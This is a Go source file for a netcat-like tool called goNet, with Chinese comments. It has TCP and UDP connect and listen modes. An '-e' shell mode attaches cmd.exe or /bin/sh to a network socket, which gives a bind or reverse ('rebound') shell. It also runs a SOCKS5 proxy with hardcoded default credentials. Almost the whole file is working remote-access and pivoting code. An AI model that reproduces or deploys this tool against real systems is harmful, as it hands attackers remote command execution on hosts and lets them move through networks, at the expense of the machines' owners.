package main

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"syscall"

	"github.com/armon/go-socks5"
	flag "github.com/spf13/pflag"
)

var config struct {
	Help     bool
	Verbose  bool
	Listen   bool
	Tcp      bool
	Udp      bool
	Exec     bool
	Socks    bool
	Port     int
	Host     string
	Username string
	Password string
}

var logger *log.Logger

func init() {
	logger = log.New(os.Stderr, "", log.LstdFlags)
	flag.BoolVar(&config.Help, "help", false, "Show help")
	flag.BoolVarP(&config.Verbose, "verbose", "v", false, "Verbose mode")
	flag.BoolVarP(&config.Listen, "listen", "l", false, "Listen mode")
	flag.BoolVarP(&config.Tcp, "tcp", "t", true, "TCP mode")
	flag.BoolVarP(&config.Udp, "udp", "u", false, "UDP mode, The listen module uses sending pika to exit")
	flag.BoolVarP(&config.Exec, "execute", "e", false, "shell mode")
	flag.BoolVarP(&config.Socks, "socks", "s", false, "socks5 forward proxy")
	flag.StringVar(&config.Username, "user", "pikaq", "User name")
	flag.StringVar(&config.Password, "pass", "pikap", "Password")
	flag.IntVarP(&config.Port, "port", "p", 20090, "Port connection or rebound shell, agent")
	flag.StringVarP(&config.Host, "host", "h", "0.0.0.0", "Host connection or rebound shell, agent")
	flag.Usage = usage
	flag.Parse()
}

func logf(f string, v ...interface{}) {
	if config.Verbose {
		logger.Printf(f, v...)
	}
}

func usage() {
	fmt.Println("Usage: goNet [options]")
	flag.PrintDefaults()
}

// 网络连接执行命令
func execCommand(conn net.Conn) {
	defer conn.Close()
	var cmd *exec.Cmd
	logf("%s/%s\n", runtime.GOOS, runtime.GOARCH)
	conn.Write([]byte(fmt.Sprintf("%s/%s\n", runtime.GOOS, runtime.GOARCH)))

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	case "linux":
		cmd = exec.Command("/bin/sh")
	case "freebsd":
		cmd = exec.Command("/bin/csh")
	default:
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err := cmd.Run(); err != nil {
		logf("Command execution error: %v", err)
	}
}

// 处理网络连接
func handleConnection(conn net.Conn, exec bool) {
	defer conn.Close()
	if exec {
		// 执行命令
		execCommand(conn)
		return
	}
	// 复制数据到标准输出
	go io.Copy(os.Stdout, conn)

	fi, err := os.Stdin.Stat()
	if err != nil {
		logf("Stdin stat failed: %v", err)
		return
	}
	// 检查标准输入类型
	if (fi.Mode() & os.ModeCharDevice) == 0 {
		buffer, err := ioutil.ReadAll(os.Stdin)
		if err != nil {
			logf("Failed read: %v", err)
		}
		io.Copy(conn, bytes.NewReader(buffer))
	} else {
		io.Copy(conn, os.Stdin)
	}
}

// TCP监听器
func tcpListen(port int, exec bool) {
	// 监听地址生成
	listenAddr := net.JoinHostPort("0.0.0.0", strconv.Itoa(port))
	// 创建监听器
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		logf("Listen error: %v", err)
		return
	}
	logf("Listening on: %s", listenAddr)

	for {
		conn, err := listener.Accept()
		if err != nil {
			logf("Accept error: %v", err)
			continue
		}
		logf("Connected to: %s", conn.RemoteAddr())
		// 处理连接
		go handleConnection(conn, exec)
	}
}

// UDP监听器
func udpListen(host string, port int) {
	// 初始化监听地址
	listenAddr := net.JoinHostPort(host, strconv.Itoa(port))
	//  创建UDP监听器
	listener, err := net.ListenUDP("udp", &net.UDPAddr{
		IP:   net.ParseIP(host),
		Port: port,
	})
	if err != nil {
		logf("Listen failed: %v", err)
		return
	}
	logf("Listening on: %s", listenAddr)
	defer listener.Close()
	// 监听循环
	for {
		buf := make([]byte, 1024)
		n, addr, err := listener.ReadFromUDP(buf)
		if err != nil {
			logf("Read failed: %v", err)
			continue
		}
		logf("Received from %s: %s", addr, buf[:n])
		// 发送pika退出信号
		if string(buf[:n-1]) == "pika" {
			os.Exit(0)
		}
		go io.Copy(os.Stdout, bytes.NewReader(buf[:n]))
	}
}

// 建立网络连接并处理连接
func Dial(network, host string, port int, exec bool) {
	dialAddr := net.JoinHostPort(host, strconv.Itoa(port))
	conn, err := net.Dial(network, dialAddr)
	if err != nil {
		logf("Dial error: %v", err)
		return
	}
	logf("Dialed host: %s://%s", network, dialAddr)
	defer func(conn net.Conn) {
		logf("Closed: %s", dialAddr)
		conn.Close()
	}(conn)

	handleConnection(conn, exec)
}

func socks(port int, host, username, password string) {
	//配置认证方法
	conf := &socks5.Config{
		AuthMethods: []socks5.Authenticator{
			socks5.UserPassAuthenticator{
				Credentials: socks5.StaticCredentials{
					username: password,
				},
			},
		},
	}
	//创建SOCKS5服务器
	server, err := socks5.New(conf)
	if err != nil {
		logf("SOCKS5 server creation error: %v", err)
		return
	}
	//绑定地址和端口
	hosts := net.JoinHostPort(host, strconv.Itoa(port))
	//启动服务
	if err := server.ListenAndServe("tcp", hosts); err != nil {
		logf("SOCKS5 server ListenAndServe error: %v", err)
		return
	}
}

func main() {
	if config.Help {
		usage()
		return
	}

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT)
	go func() {
		<-sigs
		logf("Exited")
		os.Exit(0)
	}()
	//socks代理功能
	if config.Socks {
		socks(config.Port, config.Host, config.Username, config.Password)
		return
	}
	//监听模式
	if config.Listen {
		if config.Udp {
			udpListen(config.Host, config.Port)
			return
		}
		tcpListen(config.Port, config.Exec)
		return
	}
	//UDP连接
	if config.Udp {
		Dial("udp", config.Host, config.Port, config.Exec)
		return
	}
	//TCP连接
	if config.Tcp {
		Dial("tcp", config.Host, config.Port, config.Exec)
		return
	}
}
